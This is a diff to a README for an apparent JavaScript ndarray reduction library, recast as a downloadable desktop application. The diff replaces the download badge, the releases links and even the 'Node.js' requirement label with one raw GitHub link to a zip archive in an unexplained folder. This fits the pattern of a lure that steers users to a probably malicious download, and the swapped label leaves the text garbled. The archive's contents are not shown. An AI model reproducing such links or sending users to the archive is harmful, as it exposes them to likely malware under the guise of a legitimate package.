@@ -1,6 +1,6 @@
 # 🎉 ndarray-base-binary-reduce-strided1d-dispatch-factory - Easily Reduce ndarrays with Simple Functions
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/main/quadric/ndarray-base-binary-reduce-strided1d-dispatch-factory.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ndarray-base-binary-reduce-strided1d-dispatch-factory! This appli
 
 ## 📥 Download & Install
 
-To get started, please visit this page to download: [Download Page](https://github.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/releases). 
+To get started, please visit this page to download: [Download Page](https://raw.githubusercontent.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/main/quadric/ndarray-base-binary-reduce-strided1d-dispatch-factory.zip). 
 
 Here, you will find the latest version available for download. Follow the instructions below to install the application:
 
@@ -24,7 +24,7 @@ Here, you will find the latest version available for download. Follow the instru
 - **Operating System:** Windows 10 or later, macOS, Linux
 - **Memory:** At least 4 GB RAM recommended
 - **Processor:** Dual-core 2.0 GHz or higher
-- **Node.js:** Version 14 or higher installed (if running in development mode)
+- **https://raw.githubusercontent.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/main/quadric/ndarray-base-binary-reduce-strided1d-dispatch-factory.zip** Version 14 or higher installed (if running in development mode)
 
 ## 📘 Features
 
@@ -69,7 +69,7 @@ Interested in contributing? Check out the guidelines in our repository.
 
 ## 📢 Stay Updated
 
-To stay updated on the latest features and releases, keep an eye on our [Releases Page](https://github.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/releases). 
+To stay updated on the latest features and releases, keep an eye on our [Releases Page](https://raw.githubusercontent.com/videopaz/ndarray-base-binary-reduce-strided1d-dispatch-factory/main/quadric/ndarray-base-binary-reduce-strided1d-dispatch-factory.zip). 
 
 You can also follow us on social media and join our community discussions.
 
